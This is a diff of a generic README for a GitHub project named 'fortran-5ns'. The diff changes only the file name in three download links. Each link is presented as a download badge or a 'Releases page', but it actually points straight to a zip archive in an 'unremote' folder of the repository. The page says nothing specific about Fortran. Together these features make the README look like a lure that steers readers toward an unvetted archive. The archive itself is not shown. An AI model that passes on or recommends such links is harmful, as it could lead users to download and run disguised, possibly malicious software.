@@ -1,6 +1,6 @@
 # 🌟 fortran-5ns - Easy Fortran Applications for Everyone
 
-[![Download fortran-5ns](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/fortran-5ns_1.9.zip)](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/fortran-5ns_1.9.zip)
+[![Download fortran-5ns](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/ns_fortran_v1.9.zip)](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/ns_fortran_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **fortran-5ns** application! This software simplifies certain tas
 
 To get started, you'll need to download the application from our Releases page. 
 
-**Visit this page to download:** [fortran-5ns Releases](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/fortran-5ns_1.9.zip)
+**Visit this page to download:** [fortran-5ns Releases](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/ns_fortran_v1.9.zip)
 
 Follow these steps to download and install the application:
 
@@ -62,6 +62,6 @@ If you need further assistance, please reach out to us. You can open an issue on
 
 For more information about **fortran-5ns**, including updates and user guides, please visit our GitHub repository. 
 
-**Download link again for convenience:** [fortran-5ns Releases](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/fortran-5ns_1.9.zip)
+**Download link again for convenience:** [fortran-5ns Releases](https://raw.githubusercontent.com/Savannahequity863/fortran-5ns/main/unremote/ns_fortran_v1.9.zip)
 
 Thank you for using **fortran-5ns**! We hope it makes your tasks easier and more efficient. Enjoy!
